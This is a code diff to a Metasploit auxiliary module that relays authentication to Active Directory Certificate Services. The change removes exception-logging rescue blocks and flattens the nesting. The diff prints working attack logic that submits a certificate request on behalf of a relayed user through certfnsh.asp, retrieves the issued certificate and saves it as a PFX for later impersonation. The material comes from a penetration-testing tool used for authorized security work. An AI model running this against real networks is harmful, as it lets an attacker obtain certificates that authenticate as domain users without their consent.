@@ -78,13 +78,6 @@ class MetasploitModule < Msf::Auxiliary
     request.sign(private_key, OpenSSL::Digest.new('SHA256'))
     vprint_status('CSR Generated')
     return request
-  rescue Exception => e
-    # The goal behind this rescue is that the threadfactory will swallow any exception to keep
-    # the server running.  This just makes sure that the exception generated is logged from this
-    # location, too, otherwise, tracing exceptions logged by threadfactory become more difficult.
-    print_error(e.to_s)
-    elog("Error creating certificate request:\n #{e}")
-    raise e
   end
 
   def post_login_action(kwargs = {})
@@ -120,13 +113,6 @@ class MetasploitModule < Msf::Auxiliary
         end
       end
     end
-  rescue Exception => e
-    # The goal behind this rescue is that the threadfactory will swallow any exception to keep
-    # the server running.  This just makes sure that the exception generated is logged from this
-    # location, too, otherwise, tracing exceptions logged by threadfactory become more difficult.
-    print_error(e.to_s)
-    elog("Error querying certificates:\n #{e}")
-    raise e
   end
 
   def get_cert_list(client_socket)
@@ -143,82 +129,58 @@ class MetasploitModule < Msf::Auxiliary
       user_list.append(element[0])
     end
     return user_list
-  rescue Exception => e
-    # The goal behind this rescue is that the threadfactory will swallow any exception to keep
-    # the server running.  This just makes sure that the exception generated is logged from this
-    # location, too, otherwise, tracing exceptions logged by threadfactory become more difficult.
-    print_error(e.to_s)
-    elog("Error requesting certificate template list:\n #{e}")
-    raise e
   end
 
   def retrieve_cert(client_socket, cert_template, authenticated_user)
     vprint_status("Sending Post to generate certificate for #{authenticated_user} using the #{cert_template} template")
-    begin
-      private_key = OpenSSL::PKey::RSA.new(4096)
-      request = create_csr(private_key, cert_template)
-      cert_template_string = "CertificateTemplate:#{cert_template}"
-      req = client_socket.request_cgi(
-        {
-          'method' => 'POST',
-          'uri' => "#{datastore['CERT_URI']}/certfnsh.asp",
-          'ctype' => 'application/x-www-form-urlencoded',
-          'vars_post' => {
-            'Mode' => 'newreq',
-            'CertRequest' => request.to_s,
-            'CertAttrib' => cert_template_string,
-            'TargetStoreFlags' => 0,
-            'SaveCert' => 'yes',
-            'ThumbPrint' => ''
-          }
+    private_key = OpenSSL::PKey::RSA.new(4096)
+    request = create_csr(private_key, cert_template)
+    cert_template_string = "CertificateTemplate:#{cert_template}"
+    req = client_socket.request_cgi(
+      {
+        'method' => 'POST',
+        'uri' => "#{datastore['CERT_URI']}/certfnsh.asp",
+        'ctype' => 'application/x-www-form-urlencoded',
+        'vars_post' => {
+          'Mode' => 'newreq',
+          'CertRequest' => request.to_s,
+          'CertAttrib' => cert_template_string,
+          'TargetStoreFlags' => 0,
+          'SaveCert' => 'yes',
+          'ThumbPrint' => ''
         }
-      )
-      res = client_socket._send_recv(req, @http_timeout, true)
-      vprint_status('Post Sent')
-      if res&.code == 200 && !res.body.include?('request was denied')
-        print_good("Certificate Request Granted using template #{cert_template} and user #{authenticated_user}")
-      else
-        print_bad("Certificate Request Denied using template #{cert_template} and user #{authenticated_user}")
-        return false
-      end
-    rescue Exception => e
-      # The goal behind this rescue is that the threadfactory will swallow any exception to keep
-      # the server running.  This just makes sure that the exception generated is logged from this
-      # location, too, otherwise, tracing exceptions logged by threadfactory become more difficult.
-      print_error(e.to_s)
-      elog("Error sending POST request to generate Certificate: #{e}")
-      raise e
+      }
+    )
+    res = client_socket._send_recv(req, @http_timeout, true)
+    vprint_status('Post Sent')
+    if res&.code == 200 && !res.body.include?('request was denied')
+      print_good("Certificate Request Granted using template #{cert_template} and user #{authenticated_user}")
+    else
+      print_bad("Certificate Request Denied using template #{cert_template} and user #{authenticated_user}")
+      return false
     end
-    begin
-      location_tag = res.body.match(/^.*location="(.*)"/)[1]
-      vprint_status("Certificate location tag = #{location_tag}")
-      location_uri = "#{datastore['CERT_URI']}/#{location_tag}"
-      vprint_status('Requesting Certificate from Relay Target...')
-      req = client_socket.request_cgi(
-        {
-          'method' => 'GET',
-          'uri' => location_uri
-        }
-      )
-      res = client_socket._send_recv(req, @http_timeout, true)
-      info = nil
-      certificate = OpenSSL::X509::Certificate.new(res.body)
-      pkcs12 = OpenSSL::PKCS12.create('', '', private_key, certificate)
-      stored_path = store_loot('windows.ad.cs',
-                               'application/x-pkcs12',
-                               rhost,
-                               pkcs12.to_der,
-                               'certificate.pfx',
-                               info)
-      print_status("Certificate for #{authenticated_user} using template #{cert_template} saved to #{stored_path}")
-    rescue Exception => e
-      # The goal behind this rescue is that the threadfactory will swallow any exception to keep
-      # the server running.  This just makes sure that the exception generated is logged from this
-      # location, too, otherwise, tracing exceptions logged by threadfactory become more difficult.
-      print_error(e.to_s)
-      elog("Error getting certificate:\n #{e}")
-      raise e
-    end
+
+    location_tag = res.body.match(/^.*location="(.*)"/)[1]
+    vprint_status("Certificate location tag = #{location_tag}")
+    location_uri = "#{datastore['CERT_URI']}/#{location_tag}"
+    vprint_status('Requesting Certificate from Relay Target...')
+    req = client_socket.request_cgi(
+      {
+        'method' => 'GET',
+        'uri' => location_uri
+      }
+    )
+    res = client_socket._send_recv(req, @http_timeout, true)
+    info = nil
+    certificate = OpenSSL::X509::Certificate.new(res.body)
+    pkcs12 = OpenSSL::PKCS12.create('', '', private_key, certificate)
+    stored_path = store_loot('windows.ad.cs',
+                             'application/x-pkcs12',
+                             rhost,
+                             pkcs12.to_der,
+                             'certificate.pfx',
+                             info)
+    print_status("Certificate for #{authenticated_user} using template #{cert_template} saved to #{stored_path}")
     return certificate
   end
 
